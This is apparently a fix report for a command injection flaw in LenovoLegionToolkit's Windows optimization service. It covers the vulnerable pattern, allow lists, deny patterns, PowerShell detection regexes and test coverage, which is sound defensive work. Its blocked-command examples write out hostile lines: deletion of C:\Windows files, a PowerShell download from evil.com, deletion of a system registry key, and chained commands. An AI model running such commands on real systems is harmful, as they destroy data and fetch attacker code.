# LenovoLegionToolkit Driver Interface Command Injection Fix

## Vulnerability Summary

**Location:** `WindowsOptimizationService.ExecuteCommandLineAsync()` in `WindowsOptimizationService.cs`
**Severity:** Critical (Command Injection)
**CVE Reference:** Driver interface command injection vulnerability (Round 223)

## Root Cause

The original code had several security flaws:

1. **No input validation** on commands before execution
2. **Simple string splitting** by space to separate filename and arguments
3. **No whitelist** of allowed commands
4. **Direct string concatenation** for command execution
5. **No validation** of action keys or service names

### Original Vulnerable Code Pattern:
```csharp
// VULNERABLE: Simple split without validation
var parts = command.Split(' ', 2);
var fileName = parts[0];
var arguments = parts.Length > 1 ? parts[1] : string.Empty;

// VULNERABLE: No whitelist check
using var process = new Process
{
    StartInfo = new ProcessStartInfo
    {
        FileName = fileName,  // Can be any executable
        Arguments = arguments, // No injection detection
        ...
    }
};
```

## Security Fixes Applied

### 1. Whitelist-Based Command Validation

Added a strict whitelist of allowed executables:

```csharp
private static readonly HashSet<string> AllowedCommands = new(StringComparer.OrdinalIgnoreCase)
{
    "powercfg",      // Power configuration
    "ipconfig",      // Network configuration
    "netsh",         // Network shell
    "dism",          // Deployment Image Servicing
    "del",           // Delete files (restricted)
    "rd",            // Remove directory (restricted)
    "reg",           // Registry operations
    "schtasks",      // Task scheduler
    "sc",            // Service control
    "wevtutil",      // Windows Event Utility
    "cleanmgr",      // Disk cleanup
};
```

### 2. Command Injection Pattern Detection

Implemented comprehensive pattern detection:

```csharp
private static readonly string[] DangerousPatterns = new[]
{
    "&&",      // Command chaining
    "||",      // Command chaining
    ";",       // Command separator
    "`",       // PowerShell execution
    "$(",      // Command substitution
    "..",      // Directory traversal
    "%00",     // Null byte injection
    "${",      // Shell variable expansion
    "<(",      // Process substitution
};
```

### 3. Parameterized Command Parsing

Replaced simple string split with proper command line parsing:

```csharp
private static (string fileName, string arguments) ParseCommandLine(string command)
{
    // Handle quoted paths correctly
    if (command.StartsWith("\"", StringComparison.Ordinal))
    {
        var endQuote = command.IndexOf('\"', 1);
        // ... proper parsing logic
    }
    // ...
}
```

### 4. Input Validation Functions

Added multiple validation layers:

- **`IsValidCommand()`** - Validates complete command string
- **`IsValidActionKey()`** - Validates action key format (prevents injection via action keys)
- **`IsValidServiceName()`** - Validates service name format
- **`IsValidFileName()`** - Validates file paths (blocks directory traversal)

### 5. High-Risk Command Restrictions

Special validation for dangerous commands:

```csharp
private static readonly HashSet<string> HighRiskCommands = new(StringComparer.OrdinalIgnoreCase)
{
    "del",
    "rd",
    "cmd.exe",
    "reg"
};
```

Each high-risk command has specific argument validation:
- **del/rd**: Block deletion of system directories
- **reg**: Block deletion of critical registry keys

### 6. PowerShell-Specific Protections

Added detection for PowerShell obfuscation techniques:

```csharp
private static readonly Regex[] PowerShellDangerousPatterns = new[]
{
    new Regex(@"-[eE][nN][cC]?\s+", RegexOptions.Compiled),           // -enc encoded commands
    new Regex(@"-[eE][nN][cC]?\s+[a-zA-Z0-9+/]{50,}={0,2}"),          // Base64 payloads
    new Regex(@"[iI][eE][xX]|[iI]nvoke-[eE]xpression"),               // Invoke-Expression
};
```

## Files Modified

1. **`LenovoLegionToolkit.Lib/Optimization/WindowsOptimizationService.cs`**
   - Added command whitelist
   - Added `CommandInjectionValidator` class
   - Rewrote `ExecuteCommandLineAsync()` with proper validation
   - Added `ParseCommandLine()` for safe argument parsing
   - Added action key and service name validation

2. **`LenovoLegionToolkit.Lib/System/CMD.cs`**
   - Enhanced `ContainsDangerousInput()` with more patterns
   - Added PowerShell-specific validation
   - Added `SanitizeInput()` helper method
   - Added `IsSafeCommand()` high-level validation

3. **`LenovoLegionToolkit.Tests/CommandInjectionTests.cs`** (New)
   - Comprehensive unit tests for command injection detection
   - Attack vector tests (real-world payloads)
   - Whitelist enforcement tests
   - Integration tests with CMD.RunAsync

## Security Test Coverage

The fix includes comprehensive unit tests covering:

### Pattern Detection Tests
- Command chaining: `&&`, `||`, `;`
- Pipe injection: `|`
- Command substitution: `$(...)`, `` `...` ``
- Directory traversal: `../`, `..\`
- PowerShell obfuscation: `-enc`, `iex`, `Invoke-Expression`

### Attack Vector Tests
- Basic command injection: `powercfg /list && whoami`
- Encoded payloads: Base64-encoded PowerShell commands
- Process substitution: `powercfg $(whoami)`
- Directory traversal attacks
- Null byte injection

### Whitelist Enforcement Tests
- Unknown executables blocked
- PowerShell directly blocked (not in whitelist)
- cmd.exe requires strict validation
- Allowed commands accepted

## Validation Examples

### Blocked Commands:
```
❌ powercfg /list && del /f /q C:\Windows\*.*
❌ ipconfig | powershell -Command "Invoke-WebRequest http://evil.com/payload.ps1"
❌ netsh;calc.exe
❌ dism /online $(whoami)
❌ cmd /c "malicious command"
❌ powershell -enc <base64_payload>
❌ reg delete "HKLM\System" /f
```

### Allowed Commands:
```
✅ powercfg /list
✅ powercfg /change monitor-timeout-ac 10
✅ ipconfig /all
✅ netsh interface show interface
✅ dism /online /get-features
✅ reg query "HKLM\Software\Microsoft"
```

## Deployment Notes

1. The changes are backward compatible for legitimate use cases
2. Any plugins using custom optimization commands must use whitelisted executables
3. Invalid commands are logged and skipped rather than throwing exceptions (defense in depth)
4. High-risk commands have additional argument validation

## Security Best Practices Applied

1. **Defense in Depth**: Multiple layers of validation
2. **Whitelisting**: Only explicitly allowed commands permitted
3. **Fail-Safe**: Invalid commands are rejected by default
4. **Logging**: All security events are logged for audit
5. **Input Validation**: Strict validation on all user inputs
6. **Parameterized Execution**: Arguments passed separately, not concatenated
7. **Least Privilege**: High-risk commands have restricted capabilities

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- CWE-77: Command Injection
- CWE-78: OS Command Injection
